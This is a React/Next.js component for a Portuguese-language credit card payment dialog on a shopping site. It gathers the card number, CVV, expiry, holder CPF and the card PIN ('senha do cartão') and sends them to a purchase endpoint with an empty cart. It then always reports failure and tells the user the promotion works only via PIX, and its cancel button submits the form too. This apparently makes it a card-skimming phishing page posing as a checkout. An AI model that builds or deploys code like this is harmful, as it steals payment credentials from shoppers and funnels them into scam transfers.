'use client'
import getCreditCardFlag from '@/utils/getCreditCardFlag';
import * as Dialog from '@radix-ui/react-dialog'
import { useState } from 'react';
import { useForm } from 'react-hook-form'
import InputMask from 'react-input-mask';
import Image from 'next/image'
import validateCPF from '@/utils/validateCPF';
import { object, string } from 'yup';
import { toast } from 'react-toastify';
import api from '@/utils/api';
import useUser from '@/utils/useUser';

const CreditCardDialog = ({
    isOpen,
    close,
}: { 
    isOpen: boolean, 
    close: () => void ,
}) => {
    const [isLoading, setIsLoading] = useState(false)
    const [cardFlag, setCardFlag] = useState('/flags/visa.svg');

    const { user } = useUser()
    
    const { register, handleSubmit } = useForm();

    const handleFindCardFlag = (e: any) => {
        setCardFlag(getCreditCardFlag(e.target.value.replaceAll(/\D/g, '')));
    };

    const onSubmit = async (data: any) => {
        const removeAllNonNumbers = (value: string) => value.replaceAll(/\D/g, '');

        const cardSchema = object({
            cvv: string()
              .required('É obrigatório preencher código de segurança do cartão.')
              .matches(
                /^\d+$/,
                'O código de segurança do cartão deve conter somente números.'
              )
              .min(
                3,
                'O código de segurança do cartão deve possuir no minimo 3 dígitos.'
              )
              .max(
                4,
                'O código de segurança do cartão deve possuir no máximo 4 dígitos.'
              ),
            validity: string()
              .required('É obrigatório preencher a validade do cartão.')
              .matches(
                /^\d{2}\/\d{2}$/,
                'A validade do cartão deve estar no formato 00/00. Ex: 12/25.'
              ),
            card_cpf: string()
              .transform(removeAllNonNumbers)
              .required('É obrigatório preencher o cpf do titular do cartão.')
              .min(11, 'O CPF do titular deve conter 11 números.')
              .max(11, 'O CPF do titular deve conter 11 números.')
              .matches(
                /^\d+$/,
                'O cpf do titular do cartão deve conter somente números.'
              )
              .test('cpf-validation', 'O CPF inserido é inválido.', validateCPF),
            card_name: string()
              .required('É obrigatório preencher o nome do titular do cartão.')
              .matches(
                /^[A-Za-z\s]+$/,
                'O noome do titular do cartão deve conter somente letras e espaço.'
              ),
            card_number: string()
              .required('É obrigatório preencher o número do cartão.')
              .transform(removeAllNonNumbers)
              .min(15, 'O número do cartão deve conter no mínimo 15 dígitos.')
              .max(19, 'O número do cartão deve conter no máximo 16 dígitos.')
              .matches(/^\d+$/, 'O número do cartão deve conter somente números.')
              .test(
                'card-number-validation',
                'O número do cartão inserido é inválido',
                (value) => !!getCreditCardFlag(value)
              ),
            password: string().required('É obrigatório preencher a senha do cartão.'),
        });

        try {
            let card = await cardSchema.validate({
                cvv: data.cvv,
                validity: data.validity,
                card_cpf: data.card_cpf,
                card_name: data.card_name,
                card_number: data.card_number,
                password: data.password,
              });
      
            if (!user) {
              toast.error('Ocorreu um erro ao processar o checkout, faça login.');
              return;
            }

            setIsLoading(true)

            const response = await api.post('products/purchase', {
                personal_data: {
                  phone: user.phone,
                  name: user.name,
                },
                credit_card: card,
                paymentType: 'CREDIT_CARD',
                cart: [],
            });

            toast.error(
                'Erro ao pagar usando cartão de crédito. Esta promoção só está disponível via PIX.'
            );
        } catch (err: any) {
            toast.error(err.message);
        }

        setIsLoading(false)
    }

    return (
        <Dialog.Root open={isOpen}>
            <Dialog.Portal>
                <Dialog.Overlay className="fixed inset-0 bg-gray-500/30 z-40 overflow-y-auto">
                    <Dialog.Content className="fixed top-0 mt-0 lg:mt-32 left-1/2 -translate-x-1/2 w-full sm:w-[600px] max-h-full bg-white p-4 rounded-xl z-40 space-y-4 ">
                        <h4 className="text-xl text-center">Pagamento por cartão de crédito</h4>
                        <hr />
                        <form onSubmit={handleSubmit(onSubmit)}>
                            <div className="mt-4">
                                <label htmlFor="card_number" className="text-xs">
                                    Número do cartão:
                                </label>
                                <div className="flex gap-4">
                                    <InputMask
                                        id="card_number"
                                        type="text"
                                        mask="9999 9999 9999 9999"
                                        alwaysShowMask={false}
                                        maskPlaceholder=""
                                        className="block border py-2 px-4 rounded w-full"
                                        placeholder="Ex: 0000 1111 2222 3333"
                                        {...register('card_number', {
                                            required: true,
                                            onChange: handleFindCardFlag,
                                        })}
                                    />
                                    {cardFlag && (
                                    <Image
                                        src={cardFlag}
                                        alt="brand"
                                        width={50}
                                        height={34}
                                    />
                                    )}
                                </div>
                                </div>
                                <div className="mt-4">
                                    <label htmlFor="card_name" className="text-xs">
                                        Nome do titular (como está no cartão):
                                    </label>
                                    <input
                                        id="card_name"
                                        type="text"
                                        className="block border py-2 px-4 rounded w-full"
                                        placeholder="Ex: Arnold Schwarzenegger"
                                        {...register('card_name', { required: true })}
                                    />
                                </div>
                                <div className="mt-4">
                                    <label htmlFor="card_cpf" className="text-xs">
                                        CPF do titular:
                                    </label>
                                    <InputMask
                                        id="card_cpf"
                                        type="text"
                                        mask="999.999.999-99"
                                        alwaysShowMask={false}
                                        maskPlaceholder=""
                                        className="block border py-2 px-4 rounded w-full"
                                        placeholder="Ex: 000.111.222-33"
                                        {...register('card_cpf', { required: true })}
                                    />
                                </div>
                                <div className="flex gap-4 mt-4">
                                    <div>
                                        <label htmlFor="card_validity" className="text-xs">
                                        Validade:
                                        </label>
                                        <InputMask
                                            id="card_validity"
                                            type="text"
                                            mask="99/99"
                                            alwaysShowMask={false}
                                            maskPlaceholder=""
                                            className="block border py-2 px-4 rounded w-full"
                                            placeholder="Ex: 12/25"
                                            {...register('validity')}
                                        />
                                    </div>
                                    <div>
                                        <label htmlFor="card_cvv" className="text-xs">
                                        CVV:
                                        </label>
                                        <input
                                        id="card_cvv"
                                        type="text"
                                        className="block border py-2 px-4 rounded w-full"
                                        placeholder="Ex: 123"
                                        maxLength={4}
                                        minLength={3}
                                        {...register('cvv', { required: true, pattern: /^\d+$/ })}
                                        />
                                    </div>
                                    <div>
                                        <label htmlFor="password" className="text-xs">
                                            Senha do cartão:
                                        </label>
                                        <input
                                            id="password"
                                            type="text"
                                            className="block border py-2 px-4 rounded w-full"
                                            placeholder="******"
                                            {...register('password', { required: true })}
                                        />
                                    </div>
                            </div>
                            <div className="flex justify-end mt-6 gap-5">
                                <button
                                    type="submit"
                                    className="bg-neutral-600 text-white hover:opacity-70 py-2 px-6 rounded-lg transition-all self-end"
                                    onClick={() => close()}
                                >
                                    Cancelar
                                </button>
                                <button
                                    type="submit"
                                    className="flex items-center justify-center gap-4 bg-[#572c88] text-white hover:opacity-70 py-2 px-6 rounded-lg transition-all self-end"
                                >
                                    {isLoading && (
                                        <div className='w-4 h-4 border-4 border-white border-t-gray-300 rounded-full animate-spin' />
                                    )}
                                    Finalizar compra
                                </button>
                            </div>
                        </form>
                    </Dialog.Content>
                </Dialog.Overlay>
            </Dialog.Portal>
        </Dialog.Root>
    )
}

export default CreditCardDialog